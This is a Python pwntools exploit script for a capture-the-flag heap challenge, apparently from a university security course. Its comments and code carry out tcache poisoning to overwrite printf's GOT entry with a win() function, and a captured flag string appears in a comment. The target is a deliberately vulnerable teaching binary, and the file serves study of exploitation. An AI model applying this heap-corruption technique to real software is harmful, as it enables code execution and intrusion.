#!/usr/bin/env python3

import pwn

# this is required on gnome to start gdb
pwn.context.terminal = ['gnome-terminal', '--']

# pwninit
exe = pwn.ELF("./vuln_patched")
libc = pwn.ELF("./libc.so.6")
ld = pwn.ELF("./ld-linux-x86-64.so.2")

pwn.context.arch = 'amd64'
#pwn.context.binary = exe

#port = 33108
#conn = pwn.remote('tasks.ws24.softsec.rub.de', port)
conn = pwn.process([exe.path])

#pwn.gdb.attach(conn, gdbscript="""
#set detach-on-fork off
#set follow-fork-mode child
#""")


# do stuff

# overview:
#- no pie => win() function is at well known position (0x401810) (via 'p win' in gdb)
#- i can override the .got of printf() (0x403870) to win() (0x401810) as no RELRO
#- attack overview
#    - 1) "create" account 1 (malloc() for log 1)
#    - 2) "create" account 2 (malloc() for log 2)
#    - 3) "widthdraw" 0 from account 1 (free() for log 1)
#    - 4) "wdithdraw" 0 from account 2 (free() for log 2)
#    - => now 8 Byte tcache has two entries:
#        - log2 with log2.next = log1
#        - log1 with log1.next = NULL
#    - 5) "deposit" account 2 with deposit = 0x403870 (.got of printf)
#        - overrites log2.next = 0x403870
#    - 6) "create" account 3 
#        - malloc() for log reuses log2
#    - 7) "create" account 4
#        - malloc() returns pointer 0x403870 (.got of printf)
#    - 8) "deposit" account 4 with desposit = 0x401810 (pointer to win())

def create_account(id: bytes):
    conn.sendlineafter(b'> ', b'1')
    conn.sendlineafter(b'What is the account identifier (8 bytes long)?\n', id)

def widthdraw(account: bytes, amount: bytes):
    conn.sendlineafter(b'> ', b'3')
    conn.sendlineafter(b'What account should I withdraw funds from?\n', account)
    conn.sendlineafter(b'How much money should I withdraw from this account?\n', amount)

def deposit(account: bytes, amount: bytes):
    conn.sendlineafter(b'> ', b'2')
    conn.sendlineafter(b'What account should I deposit funds into?\n', account)
    conn.sendlineafter(b'How much money should I deposit in this account?\n', amount)


pwn.pause()
create_account(b'AAAAAAAA')
create_account(b'BBBBBBBB')
widthdraw(b'AAAAAAAA', b'0')
widthdraw(b'BBBBBBBB', b'0')
# .got of printf is at 0x403870 (fix as no pie) (got)
deposit(b'BBBBBBBB', str(0x403870).encode())
print(str(0x403870).encode())
create_account(b'CCCCCCCC')
create_account(b'DDDDDDDD')
# function win() at: 0x401810 (fix as no pie) (p win)
deposit(b'DDDDDDDD', str(0x401810).encode())
#softsec{jzJGPmu0-qss94i6C01KQVFFOrrJIGqGN7tunUJX3VAbEtd9_nh3UMNhU_HlKkFz}
conn.interactive()
